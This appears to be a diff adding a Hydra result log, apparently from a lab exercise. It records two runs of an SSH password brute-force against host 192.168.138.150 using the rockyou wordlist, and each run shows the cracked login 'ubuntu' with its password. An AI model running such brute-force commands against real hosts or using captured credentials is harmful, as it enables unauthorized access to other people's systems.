@@ -1,0 +1,4 @@
+# Hydra v9.6 run at 2026-02-27 08:49:24 on 192.168.138.150 ssh (hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt -t 4 -V -o /home/kali/hydra-result.txt ssh://192.168.138.150)
+[22][ssh] host: 192.168.138.150   login: ubuntu   password: Ubuntu@789
+# Hydra v9.6 run at 2026-03-03 08:38:32 on 192.168.138.150 ssh (hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt -t 4 -V -o /home/kali/hydra-result.txt ssh://192.168.138.150)
+[22][ssh] host: 192.168.138.150   login: ubuntu   password: Ubuntu@789
